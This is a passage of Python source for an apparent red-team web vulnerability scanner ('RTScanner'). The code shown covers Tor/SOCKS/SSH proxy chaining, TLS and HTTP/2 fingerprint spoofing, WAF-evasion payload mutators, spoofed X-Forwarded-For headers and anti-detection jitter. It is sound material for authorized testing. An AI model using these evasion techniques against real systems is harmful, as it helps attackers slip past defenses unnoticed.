#!/usr/bin/env python3
"""
================================================================================
 PROFESSIONAL WEB SECURITY ASSESSMENT TOOL - RED TEAM EDITION v3.2.0
================================================================================
 Author  : Dwi Joko Purwanto
 Version : 3.2.0
 Purpose : Authorized Security Assessment Only

 NEW IN v3.2.0 (over v3.1.0):
   [1] SQLite State & Resume                    -> --state-db / --resume
   [2] Deep Endpoint Discovery                  -> auto: sitemap/JS/Swagger
   [3] Interactive Shell & Post-Exploitation    -> --interactive-shell / --os-cmd
   [4] External Wordlist & Plugin Ecosystem     -> --param-wordlist / --payload-dir / --plugin-dir
   [5] Advanced Evasion (TLS/JA3/JA4 + HTTP/2)  -> --impersonate / --http2-spoof

 CARRY-OVER FROM v3.1.0:
   [A] Proxy chaining (SOCKS4/5, Tor, SSH)      -> --proxy-chain / --ssh-tunnel
   [B] WAF evasion & obfuscation engine         -> --evade / --evade-aggressive
   [C] Smart session (Playwright SPA/CSRF)      -> auto via --auth-form-url
   [D] Safe PoC verification                    -> --verify-poc
   [E] Gaussian jitter + anti-forensic          -> --jitter-* / --anti-forensic

 CARRY-OVER FROM v3.0.0:
   OOB blind detection, template system, async concurrency,
   15+ vuln classes, CVE matching, auth (cookie/bearer/basic/form),
   SARIF/JSON output.
================================================================================
"""

import sys, os, re, json, time, random, argparse, hashlib, datetime, asyncio, logging
import base64, uuid, socket, ipaddress, glob, shutil, atexit, signal, ssl
import sqlite3
import xml.etree.ElementTree as ET
from pathlib import Path
from collections import defaultdict
import threading

from dataclasses import dataclass, field, asdict
from typing import List, Optional, Dict, Set, Any, Tuple, Callable
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache

try:
    import httpx
    ASYNC_AVAILABLE = True
except ImportError:
    httpx = None
    ASYNC_AVAILABLE = False

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional dependencies
try:
    import socks  # PySocks
    PYSOCKS_OK = True
except ImportError:
    socks = None
    PYSOCKS_OK = False

try:
    import paramiko
    PARAMIKO_OK = True
except ImportError:
    paramiko = None
    PARAMIKO_OK = False

try:
    from sshtunnel import SSHTunnelForwarder
    SSHTUNNEL_OK = True
except ImportError:
    SSHTunnelForwarder = None
    SSHTUNNEL_OK = False

try:
    from playwright.async_api import async_playwright
    PW_OK = True
except ImportError:
    async_playwright = None
    PW_OK = False

# v3.2.0 — Advanced evasion
try:
    from curl_cffi import requests as curl_requests
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    CURL_CFFI_OK = True
except ImportError:
    curl_requests = None
    CurlAsyncSession = None
    CURL_CFFI_OK = False

try:
    import h2.connection
    import h2.config
    import h2.events
    import h2.settings
    H2_OK = True
except ImportError:
    h2 = None
    H2_OK = False

# ==============================================================================
# CONFIG
# ==============================================================================
BANNER = r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  RTScanner v3.2.0  |  StateDB · DeepDiscovery · InteractiveShell · Plugins  ║
║  Advanced Evasion: curl_cffi JA3/JA4 · HTTP/2 Fingerprint · Wordlists       ║
║  Authorized use only.  Do not scan targets without written permission.      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

SEVERITY_MAP = {
    "Critical": {"cvss": 9.8, "color": "#c0392b", "bg": "#ffcccc", "rank": 5},
    "High":     {"cvss": 7.5, "color": "#e67e22", "bg": "#ffe6cc", "rank": 4},
    "Medium":   {"cvss": 5.3, "color": "#f39c12", "bg": "#ffffcc", "rank": 3},
    "Low":      {"cvss": 2.6, "color": "#3498db", "bg": "#e6f2ff", "rank": 2},
    "Info":     {"cvss": 0.0, "color": "#95a5a6", "bg": "#f0f0f0", "rank": 1},
}

log = logging.getLogger("RTScanner")

def setup_logging(verbose=False):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format="[%(asctime)s] [%(levelname)s] %(message)s",
                        datefmt="%H:%M:%S")

# ==============================================================================
# DATA MODELS
# ==============================================================================
@dataclass
class Finding:
    vuln_type: str
    endpoint: str
    severity: str
    cvss_score: float
    details: str
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    owasp_category: str = ""
    cve_ids: List[str] = field(default_factory=list)
    template_id: str = ""

@dataclass
class ScanReport:
    target: str
    scan_id: str
    operator: str
    authorization_ref: str
    scan_start: str
    scan_end: str = ""
    cms_info: Dict = field(default_factory=dict)
    server_info: Dict = field(default_factory=dict)
    waf_detected: str = "None detected"
    structure: List[str] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    stats: Dict = field(default_factory=dict)
    cve_matches: List[Dict] = field(default_factory=list)

# ==============================================================================
# [1] STATE & RESUME — SQLite persistence
# ==============================================================================
class ScanStateDB:
    """
    SQLite-backed scan state. Survives crashes/rate-limits.
    Tables: scan_meta, visited, tested, findings
    """
    SCHEMA = """
    CREATE TABLE IF NOT EXISTS scan_meta (
        scan_id TEXT PRIMARY KEY,
        target TEXT NOT NULL,
        started_at TEXT NOT NULL,
        finished_at TEXT,
        status TEXT DEFAULT 'running',
        args_json TEXT
    );
    CREATE TABLE IF NOT EXISTS visited (
        url TEXT PRIMARY KEY,
        status_code INTEGER,
        content_hash TEXT,
        ts TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS tested (
        target_url TEXT NOT NULL,
        param TEXT NOT NULL,
        vuln_class TEXT NOT NULL,
        result TEXT,
        ts TEXT NOT NULL,
        PRIMARY KEY (target_url, param, vuln_class)
    );
    CREATE TABLE IF NOT EXISTS findings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        scan_id TEXT NOT NULL,
        vuln_type TEXT, endpoint TEXT, severity TEXT, cvss REAL,
        details TEXT, evidence TEXT, cwe TEXT, owasp TEXT, cves_json TEXT,
        ts TEXT NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_findings_scan ON findings(scan_id);
    """

    def __init__(self, db_path: str, scan_id: str, target: str, args_dict: dict):
        self.db_path = db_path
        self.scan_id = scan_id
        self._lock = threading.Lock()
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.executescript(self.SCHEMA)
        self.conn.execute(
            "INSERT OR IGNORE INTO scan_meta(scan_id,target,started_at,args_json) VALUES(?,?,?,?)",
            (scan_id, target, datetime.datetime.now().isoformat(),
             json.dumps(args_dict, default=str))
        )
        self.conn.commit()

    def mark_visited(self, url: str, status: int, content_hash: str = ""):
        with self._lock:
            self.conn.execute(
                "INSERT OR REPLACE INTO visited(url,status_code,content_hash,ts) VALUES(?,?,?,?)",
                (url, status, content_hash, datetime.datetime.now().isoformat())
            )
            self.conn.commit()

    def is_visited(self, url: str) -> bool:
        cur = self.conn.execute("SELECT 1 FROM visited WHERE url=?", (url,))
        return cur.fetchone() is not None

    def visited_count(self) -> int:
        return self.conn.execute("SELECT COUNT(*) FROM visited").fetchone()[0]

    def mark_tested(self, target_url: str, param: str, vuln_class: str, result: str = ""):
        with self._lock:
            self.conn.execute(
                "INSERT OR REPLACE INTO tested(target_url,param,vuln_class,result,ts) VALUES(?,?,?,?,?)",
                (target_url, param, vuln_class, result, datetime.datetime.now().isoformat())
            )
            self.conn.commit()

    def was_tested(self, target_url: str, param: str, vuln_class: str) -> bool:
        cur = self.conn.execute(
            "SELECT 1 FROM tested WHERE target_url=? AND param=? AND vuln_class=?",
            (target_url, param, vuln_class)
        )
        return cur.fetchone() is not None

    def add_finding(self, f: "Finding"):
        with self._lock:
            self.conn.execute(
                "INSERT INTO findings(scan_id,vuln_type,endpoint,severity,cvss,details,evidence,cwe,owasp,cves_json,ts) "
                "VALUES(?,?,?,?,?,?,?,?,?,?,?)",
                (self.scan_id, f.vuln_type, f.endpoint, f.severity, f.cvss_score,
                 f.details, f.evidence, f.cwe_id, f.owasp_category,
                 json.dumps(f.cve_ids), datetime.datetime.now().isoformat())
            )
            self.conn.commit()

    def load_findings(self) -> List["Finding"]:
        cur = self.conn.execute(
            "SELECT vuln_type,endpoint,severity,cvss,details,evidence,cwe,owasp,cves_json "
            "FROM findings WHERE scan_id=?", (self.scan_id,)
        )
        out = []
        for row in cur.fetchall():
            out.append(Finding(
                vuln_type=row[0], endpoint=row[1], severity=row[2], cvss_score=row[3],
                details=row[4], evidence=row[5], cwe_id=row[6], owasp_category=row[7],
                cve_ids=json.loads(row[8] or "[]")
            ))
        return out

    def finish(self, status: str = "completed"):
        with self._lock:
            self.conn.execute(
                "UPDATE scan_meta SET finished_at=?, status=? WHERE scan_id=?",
                (datetime.datetime.now().isoformat(), status, self.scan_id)
            )
            self.conn.commit()

    def close(self):
        self.conn.close()

# ==============================================================================
# [A] PROXY CHAIN — SOCKS4/5, Tor, SSH dynamic
# ==============================================================================
def _check_port(host: str, port: int, timeout=1.5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False

class ProxyHop:
    def __init__(self, raw: str):
        self.raw = raw
        if raw.lower() == "tor":
            self.scheme = "socks5"
            self.host = "127.0.0.1"
            self.port = 9050
            for p in (9050, 9150):
                if _check_port("127.0.0.1", p):
                    self.port = p
                    break
            self.user = self.pwd = None
        else:
            u = urlparse(raw if "://" in raw else "http://" + raw)
            self.scheme = (u.scheme or "http").lower()
            self.host = u.hostname
            self.port = u.port or (1080 if "socks" in self.scheme else 8080)
            self.user = u.username
            self.pwd = u.password

    def url(self, with_creds=True) -> str:
        if with_creds and self.user:
            return f"{self.scheme}://{self.user}:{self.pwd}@{self.host}:{self.port}"
        return f"{self.scheme}://{self.host}:{self.port}"

    def requests_dict(self) -> Dict[str, str]:
        return {"http": self.url(), "https": self.url()}

    def __repr__(self):
        return f"<Hop {self.scheme} {self.host}:{self.port}>"

class SSHTunnel:
    def __init__(self, host, user, pwd=None, key=None, port=22, local_port=0):
        self.host, self.user, self.pwd, self.key = host, user, pwd, key
        self.port, self.local_port = port, local_port
        self._forwarder = None

    def open(self) -> int:
        if not SSHTUNNEL_OK:
            raise RuntimeError("sshtunnel required: pip install sshtunnel")
        self._forwarder = SSHTunnelForwarder(
            (self.host, self.port),
            ssh_username=self.user,
            ssh_password=self.pwd,
            ssh_pkey=self.key,
            remote_bind_address=("0.0.0.0", 0),
            local_bind_address=("127.0.0.1", self.local_port or 0),
            set_keepalive=30,
        )
        self._forwarder.start()
        self.local_port = self._forwarder.local_bind_port
        atexit.register(self.close)
        return self.local_port

    def close(self):
        if self._forwarder:
            try:
                self._forwarder.stop()
            except Exception:
                pass

class ProxyChain:
    def __init__(self, spec: Optional[str]):
        self.hops: List[ProxyHop] = []
        self._ssh: Optional[SSHTunnel] = None
        if not spec:
            return
        for raw in re.split(r"[>,]", spec.strip()):
            raw = raw.strip()
            if not raw:
                continue
            if raw.lower().startswith("ssh://"):
                self._setup_ssh(raw)
            else:
                self.hops.append(ProxyHop(raw))

    def _setup_ssh(self, raw: str):
        u = urlparse(raw)
        tun = SSHTunnel(host=u.hostname, user=u.username or os.getenv("USER"),
                        pwd=u.password, key=None, port=u.port or 22)
        try:
            lp = tun.open()
            log.info(f"SSH tunnel active: 127.0.0.1:{lp}")
            self._ssh = tun
            self.hops.append(ProxyHop(f"socks5://127.0.0.1:{lp}"))
        except Exception as e:
            log.error(f"SSH tunnel failed: {e}")

    def is_active(self) -> bool:
        return bool(self.hops)

    def for_requests(self) -> Optional[Dict[str, str]]:
        return self.hops[-1].requests_dict() if self.hops else None

    def for_httpx(self) -> Optional[str]:
        return self.hops[-1].url() if self.hops else None

    def describe(self) -> str:
        return " → ".join(repr(h) for h in self.hops) or "direct"

    def enable_pysocks_global(self):
        if len(self.hops) > 1:
            log.warning("Multi-hop: requests will only use the LAST hop via PySocks.")
        if not PYSOCKS_OK:
            log.warning("PySocks not installed — SOCKS hops ignored for requests.")
            return
        last = self.hops[-1]
        socks.set_default_proxy(
            socks.SOCKS5 if "5" in last.scheme else socks.SOCKS4,
            last.host, last.port, username=last.user, password=last.pwd)
        socket.socket = socks.socksocket
        log.info(f"PySocks global → {last.host}:{last.port}")

# ==============================================================================
# [5] ADVANCED EVASION — TLS/JA3 impersonation + HTTP/2 fingerprint spoof
# ==============================================================================
class _CurlResponseShim:
    """Make curl_cffi.Response look like httpx.Response for downstream code."""
    def __init__(self, r):
        self._r = r
        self.status_code = r.status_code
        self.headers = dict(r.headers)
        try:
            self.text = r.text if hasattr(r, "text") else r.content.decode("utf-8", "ignore")
        except Exception:
            self.text = ""
        self.content = r.content if hasattr(r, "content") else self.text.encode()
        self.cookies = {}
        try:
            for c in r.cookies:
                self.cookies[c.name] = c.value
        except Exception:
            pass

    @property
    def url(self):
        return self._r.url

    def json(self):
        try:
            return self._r.json()
        except Exception:
            return {}

class ImpersonatingClient:
    """
    curl_cffi-backed async client that mimics real browser TLS (JA3/JA4).
    Falls back to httpx AsyncClient when curl_cffi unavailable.
    """
    PROFILES = ["chrome120", "chrome124", "firefox120", "safari17_0", "edge101"]

    def __init__(self, impersonate: str = "chrome124", proxy: Optional[str] = None,
                 timeout: float = 15.0, headers: Optional[Dict] = None):
        self.impersonate = impersonate if impersonate in self.PROFILES else "chrome124"
        self.proxy = proxy
        self.timeout = timeout
        self.base_headers = headers or {}
        self.session: Optional["CurlAsyncSession"] = None
        self._fallback: Optional[httpx.AsyncClient] = None

    async def __aenter__(self):
        if CURL_CFFI_OK:
            self.session = CurlAsyncSession(
                impersonate=self.impersonate,
                timeout=self.timeout,
                proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None,
            )
            log.info(f"[Evasion] curl_cffi impersonating {self.impersonate} (JA3/JA4 spoofed)")
        else:
            log.warning("[Evasion] curl_cffi not installed → falling back to httpx "
                        "(pip install curl_cffi)")
            self._fallback = httpx.AsyncClient(
                timeout=self.timeout, verify=False, follow_redirects=True,
                proxy=self.proxy, headers=self.base_headers)
        return self

    async def __aexit__(self, *a):
        if self.session:
            try:
                await self.session.close()
            except Exception:
                pass
        if self._fallback:
            await self._fallback.aclose()

    async def request(self, method: str, url: str, **kw):
        merged = {**self.base_headers, **kw.pop("headers", {})}
        try:
            if self.session:
                r = await self.session.request(method, url, headers=merged,
                                               allow_redirects=True, **kw)
                return _CurlResponseShim(r)
            else:
                return await self._fallback.request(method, url, headers=merged, **kw)
        except Exception as e:
            log.debug(f"[Evasion] {method} {url}: {e}")
            return None

    async def get(self, url: str, **kw):
        return await self.request("GET", url, **kw)

    async def post(self, url: str, **kw):
        return await self.request("POST", url, **kw)

class Http2SpoofClient:
    """
    Low-level HTTP/2 client with configurable SETTINGS fingerprint.
    Emulates Chrome/Firefox HTTP/2 fingerprints via raw h2 over TLS.
    """
    PROFILES = {
        "chrome": {
            "settings": {
                "HEADER_TABLE_SIZE": 65536,
                "ENABLE_PUSH": 0,
                "MAX_CONCURRENT_STREAMS": 1000,
                "INITIAL_WINDOW_SIZE": 6291456,
                "MAX_HEADER_LIST_SIZE": 262144,
            },
            "window_update": 15663105,
        },
        "firefox": {
            "settings": {
                "HEADER_TABLE_SIZE": 65536,
                "ENABLE_PUSH": 0,
                "MAX_CONCURRENT_STREAMS": 100,
                "INITIAL_WINDOW_SIZE": 131072,
                "MAX_HEADER_LIST_SIZE": 65536,
            },
            "window_update": 12517377,
        },
    }

    def __init__(self, profile: str = "chrome"):
        self.profile = profile if profile in self.PROFILES else "chrome"
        self.cfg = self.PROFILES[self.profile]

    async def probe(self, host: str, path: str = "/", timeout: float = 10.0) -> Optional[Dict]:
        """Send HTTP/2 preface with spoofed SETTINGS; return server SETTINGS + headers."""
        if not H2_OK:
            log.warning("[HTTP2] h2 library missing → pip install h2")
            return None
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 443, ssl=ctx), timeout=timeout)

            cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=cfg)
            conn.initiate_connection()

            # Apply spoofed SETTINGS
            setting_map = {}
            for k, v in self.cfg["settings"].items():
                attr = getattr(h2.settings, k, None)
                if attr is not None:
                    setting_map[attr] = v
            if setting_map:
                conn.update_settings(setting_map)
            conn.increment_flow_control_window(self.cfg["window_update"])

            headers = [
                (":method", "GET"),
                (":authority", host),
                (":scheme", "https"),
                (":path", path),
                ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/124.0.0.0 Safari/537.36"),
                ("accept", "*/*"),
            ]
            conn.send_headers(1, headers, end_stream=True)
            writer.write(conn.data_to_send())
            await writer.drain()

            server_settings = {}
            buf = b""
            deadline = asyncio.get_event_loop().time() + timeout
            while asyncio.get_event_loop().time() < deadline:
                try:
                    data = await asyncio.wait_for(reader.read(65535), timeout=2.0)
                except asyncio.TimeoutError:
                    break
                if not data:
                    break
                buf += data
                try:
                    events = conn.receive_data(buf)
                except Exception:
                    break
                buf = b""
                for ev in events:
                    if isinstance(ev, h2.events.RemoteSettingsChanged):
                        server_settings = dict(ev.changed_settings)
                        try:
                            writer.close()
                        except Exception:
                            pass
                        return {"profile": self.profile,
                                "server_settings": server_settings}
            try:
                writer.close()
            except Exception:
                pass
            return None
        except Exception as e:
            log.debug(f"[HTTP2] probe {host}: {e}")
            return None

# ==============================================================================
# [B] WAF EVASION — Payload mutation + adaptive back-off
# ==============================================================================
def url_double(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")

def case_swap(payload: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in payload)

def inline_comment(payload: str) -> str:
    return payload.replace(" ", "/**/").replace("'", "'/**/")

def null_byte(payload: str, pos: int = -1) -> str:
    return payload[:pos] + "%00" + payload[pos:]

def overlong_utf8(payload: str) -> str:
    table = {"<": "%c0%bc", ">": "%c0%be", '"': "%c0%a2", "'": "%c0%a7"}
    return "".join(table.get(c, c) for c in payload)

MUTATORS: List[Callable[[str], str]] = [
    url_double, case_swap, inline_comment, null_byte, overlong_utf8,
]

class EvasionEngine:
    def __init__(self, aggressive: bool = False, max_variants: int = 5):
        self.aggressive = aggressive
        self.max_variants = max_variants
        self._403_hits: Dict[str, int] = {}

    def variants(self, payload: str, kind: str = "generic") -> List[str]:
        base = [payload]
        if self.aggressive or kind in ("sqli", "xss"):
            muts = MUTATORS if self.aggressive else [url_double, case_swap]
            for m in muts:
                try:
                    base.append(m(payload))
                except Exception:
                    pass
        seen, out = set(), []
        for p in base:
            if p not in seen:
                seen.add(p)
                out.append(p)
        random.shuffle(out)
        return out[: self.max_variants]

    def note(self, endpoint: str, status: int):
        if status in (403, 429, 503):
            self._403_hits[endpoint] = self._403_hits.get(endpoint, 0) + 1
        else:
            self._403_hits[endpoint] = 0

    def backoff_factor(self, endpoint: str) -> float:
        n = self._403_hits.get(endpoint, 0)
        return min(2 ** n, 60) if n else 0.0

def randomized_headers() -> Dict[str, str]:
    return {
        "User-Agent": random.choice(UA_POOL),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "*/*",
        ]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
    }

# ==============================================================================
# [E] JITTER — Gaussian tail-truncated
# ==============================================================================
class Jitter:
    def __init__(self, base=0.3, sigma=0.25, max_wait=5.0):
        self.base, self.sigma, self.max_wait = base, sigma, max_wait

    def _wait(self) -> float:
        return max(0.0, min(self.max_wait, random.gauss(self.base, self.sigma)))

    def sleep(self):
        time.sleep(self._wait())

    async def asleep(self):
        await asyncio.sleep(self._wait())

# ==============================================================================
# [C] SMART SESSION — Playwright + CSRF + refresh
# ==============================================================================
class SmartSession:
    def __init__(self, auth, base_url: str, keepalive_secs: int = 300, headless: bool = True):
        self.auth = auth
        self.base_url = base_url
        self.keepalive = keepalive_secs
        self.headless = headless
        self.cookies: Dict[str, str] = {}
        self.headers: Dict[str, str] = {}
        self.csrf_tokens: Dict[str, str] = {}
        self._playwright = None
        self._browser = None
        self._ctx = None
        self._page = None
        self._last_refresh = 0.0
        self._refresh_task: Optional[asyncio.Task] = None

    async def login_with_browser(self) -> bool:
        if not PW_OK:
            log.warning("Playwright not installed — fallback to static auth.")
            return False
        try:
            self._playwright = await async_playwright().start()
            self._browser = await self._playwright.chromium.launch(headless=self.headless)
            self._ctx = await self._browser.new_context(
                user_agent=random.choice(UA_POOL))
            self._page = await self._ctx.new_page()
            url = self.auth.form_login
            await self._page.goto(url, timeout=20000)
            uf, pf = self.auth.user_field, self.auth.pass_field
            await self._try_fill(uf, self.auth.form_user)
            await self._try_fill(pf, self.auth.form_pass)
            await self._page.evaluate("""() => {
                const f = document.querySelector('form');
                if (f) f.submit();
            }""")
            await self._page.wait_for_load_state("networkidle", timeout=20000)
            for c in await self._ctx.cookies():
                self.cookies[c["name"]] = c["value"]
            log.info(f"Browser login OK ({len(self.cookies)} cookies).")
            self._last_refresh = time.time()
            return True
        except Exception as e:
            log.warning(f"Browser login failed: {e}")
            return False

    async def _try_fill(self, name: str, value: str):
        for sel in (f'input[name="{name}"]', f'input[id="{name}"]',
                    f'input[placeholder*="{name}"]'):
            try:
                await self._page.fill(sel, value, timeout=2000)
                return
            except Exception:
                continue

    async def harvest_csrf(self, html: str):
        soup = BeautifulSoup(html, "html.parser")
        for m in soup.find_all("meta", {"name": re.compile(r"csrf|xsrf", re.I)}):
            self.csrf_tokens[m.get("name")] = m.get("content", "")
        for inp in soup.find_all("input",
                                 {"name": re.compile(r"csrf|token|authenticity", re.I)}):
            if inp.get("value"):
                self.csrf_tokens[inp.get("name")] = inp.get("value")

    def csrf_headers(self) -> Dict[str, str]:
        return {k: v for k, v in self.csrf_tokens.items() if v}

    async def start_keepalive(self):
        if self.keepalive <= 0 or not self.auth.form_login:
            return
        self._refresh_task = asyncio.create_task(self._keepalive_loop())

    async def _keepalive_loop(self):
        while True:
            await asyncio.sleep(self.keepalive)
            try:
                await self.refresh()
            except Exception as e:
                log.debug(f"keepalive error: {e}")

    async def refresh(self):
        if not PW_OK or not self._page:
            return
        try:
            await self._page.goto(self.base_url, timeout=15000)
            body = await self._page.content()
            if re.search(r"(sign\s*in|log\s*in|session\s*expired)", body, re.I):
                log.info("Session expired — re-login.")
                await self.login_with_browser()
            for c in await self._ctx.cookies():
                self.cookies[c["name"]] = c["value"]
        except Exception as e:
            log.debug(f"refresh failed: {e}")

    async def close(self):
        if self._refresh_task:
            self._refresh_task.cancel()
        if self._browser:
            try:
                await self._browser.close()
            except Exception:
                pass
        if self._playwright:
            try:
                await self._playwright.stop()
            except Exception:
                pass

# ==============================================================================
# AUTH CONFIG
# ==============================================================================
class AuthConfig:
    def __init__(self, cookie="", bearer="", basic="", form_login="", form_user="",
                 form_pass="", user_field="username", pass_field="password"):
        self.cookie = cookie
        self.bearer = bearer
        self.basic = basic
        self.form_login = form_login
        self.form_user = form_user
        self.form_pass = form_pass
        self.user_field = user_field
        self.pass_field = pass_field
        self.smart: Optional[SmartSession] = None

    def headers(self) -> Dict[str, str]:
        h = {}
        if self.bearer:
            h["Authorization"] = f"Bearer {self.bearer}"
        elif self.basic:
            try:
                user, pw = self.basic.split(":", 1)
            except ValueError:
                user, pw = self.basic, ""
            token = base64.b64encode(f"{user}:{pw}".encode()).decode()
            h["Authorization"] = f"Basic {token}"
        if self.cookie:
            h["Cookie"] = self.cookie
        if self.smart:
            if self.smart.cookies:
                h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.smart.cookies.items())
            h.update(self.smart.csrf_headers())
        return h

    def apply_to(self, sess: requests.Session):
        sess.headers.update(self.headers())

    async def login_async(self, client):
        if self.form_login and PW_OK:
            sm = SmartSession(self, self.form_login)
            if await sm.login_with_browser():
                self.smart = sm
                await sm.start_keepalive()
                return
        if not self.form_login:
            return
        try:
            page = await client.get(self.form_login)
            if not page:
                return
            soup = BeautifulSoup(page.text, "html.parser")
            form = soup.find("form")
            if not form:
                log.warning("Auth: no <form> found at login URL")
                return
            action = urljoin(self.form_login, form.get("action") or self.form_login)
            data = {}
            for inp in form.find_all("input"):
                n = inp.get("name")
                if n and inp.get("type") not in ("submit", "button"):
                    data[n] = inp.get("value", "")
            data[self.user_field] = self.form_user
            data[self.pass_field] = self.form_pass
            r = await client.post(action, data=data)
            if r:
                log.info(f"Auth: form login status={r.status_code}, "
                         f"cookies={dict(client.client.cookies)}")
        except Exception as e:
            log.warning(f"Auth login failed: {e}")

# ==============================================================================
# STEALTH HTTP CLIENT (sync)
# ==============================================================================
class StealthClient:
    def __init__(self, proxy=None, delay_range=(0.3, 1.2), timeout=10,
                 verify_ssl=False, jitter: Optional[Jitter] = None,
                 chain: Optional[ProxyChain] = None):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.chain = chain
        self.jitter = jitter
        self.delay_range = delay_range
        self.timeout = timeout
        if chain and chain.is_active():
            chain.enable_pysocks_global()
            p = chain.for_requests()
            if p:
                self.session.proxies = p
        elif proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _headers(self):
        return randomized_headers()

    def request(self, method, url, **kw):
        if self.jitter:
            self.jitter.sleep()
        else:
            time.sleep(random.uniform(*self.delay_range))
        try:
            kw.setdefault("headers", self._headers())
            kw.setdefault("timeout", self.timeout)
            kw.setdefault("allow_redirects", True)
            return self.session.request(method, url, **kw)
        except requests.exceptions.RequestException as e:
            log.debug(f"Request failed {url}: {e}")
            return None

    def get(self, url, **kw):
        return self.request("GET", url, **kw)

# ==============================================================================
# ASYNC HTTP CLIENT
# ==============================================================================
class AsyncClient:
    def __init__(self, auth: AuthConfig, proxy=None, timeout=10, verify=False,
                 concurrency=20, chain: Optional[ProxyChain] = None,
                 jitter: Optional[Jitter] = None,
                 waf_evasion: Optional[EvasionEngine] = None):
        if not ASYNC_AVAILABLE:
            raise RuntimeError("httpx not installed: pip install httpx")
        self.auth = auth
        self.timeout = timeout
        self.verify = verify
        self.sem = asyncio.Semaphore(concurrency)
        self.client: Optional[httpx.AsyncClient] = None
        self.jitter = jitter
        self.waf = waf_evasion
        if chain and chain.is_active():
            self.proxy = chain.for_httpx()
        else:
            self.proxy = proxy

    async def __aenter__(self):
        headers = {"User-Agent": random.choice(UA_POOL), **self.auth.headers()}
        self.client = httpx.AsyncClient(
            headers=headers, timeout=self.timeout, verify=self.verify,
            proxy=self.proxy, follow_redirects=True,
            limits=httpx.Limits(max_connections=50)
        )
        await self.auth.login_async(self)
        return self

    async def __aexit__(self, *a):
        try:
            if self.auth.smart:
                await self.auth.smart.close()
        finally:
            if self.client:
                await self.client.aclose()

    async def request(self, method, url, **kw) -> Optional[httpx.Response]:
        async with self.sem:
            if self.waf:
                factor = self.waf.backoff_factor(url)
                if factor:
                    await asyncio.sleep(factor * random.uniform(0.8, 1.2))
                hdrs = kw.setdefault("headers", {})
                hdrs.update(randomized_headers())
            if self.jitter:
                await self.jitter.asleep()
            try:
                r = await self.client.request(method, url, **kw)
                if self.waf:
                    self.waf.note(url, r.status_code)
                return r
            except Exception as e:
                log.debug(f"async {method} {url}: {e}")
                return None

    async def get(self, url, **kw):
        return await self.request("GET", url, **kw)

    async def post(self, url, **kw):
        return await self.request("POST", url, **kw)

# ==============================================================================
# OOB DETECTION
# ==============================================================================
class OOBClient:
    def __init__(self, server: str, token: str = "", domain: str = "",
                 poll_timeout: int = 15, poll_interval: float = 2.0):
        self.server = server.rstrip("/")
        self.token = token
        self.domain = domain or urlparse(server).netloc
        self.poll_timeout = poll_timeout
        self.poll_interval = poll_interval
        self.hits: List[Dict] = []
        self._lock = asyncio.Lock()

    def new_correlation_id(self) -> str:
        return f"rt{uuid.uuid4().hex[:14]}"

    def make_url(self, corr: str) -> str:
        return f"http://{corr}.{self.domain}/"

    async def _poll_once(self, client: httpx.AsyncClient) -> List[Dict]:
        try:
            params = {"correlation-id": ""}
            if self.token:
                params["token"] = self.token
            r = await client.get(f"{self.server}/poll", params=params, timeout=10)
            if r.status_code != 200:
                return []
            data = r.json() if r.headers.get("content-type", "").startswith("application/json") else []
            new = []
            if isinstance(data, dict) and "data" in data:
                new = data["data"] or []
            elif isinstance(data, list):
                new = data
            async with self._lock:
                for h in new:
                    self.hits.append(h)
            return new
        except Exception as e:
            log.debug(f"OOB poll error: {e}")
            return []

    async def wait_for_hit(self, corr_prefix: str,
                           client: httpx.AsyncClient) -> Optional[Dict]:
        deadline = time.time() + self.poll_timeout
        while time.time() < deadline:
            await self._poll_once(client)
            for h in self.hits:
                blob = json.dumps(h).lower()
                if corr_prefix.lower() in blob:
                    return h
            await asyncio.sleep(self.poll_interval)
        return None

# ==============================================================================
# TEMPLATE SYSTEM
# ==============================================================================
@dataclass
class Template:
    id: str
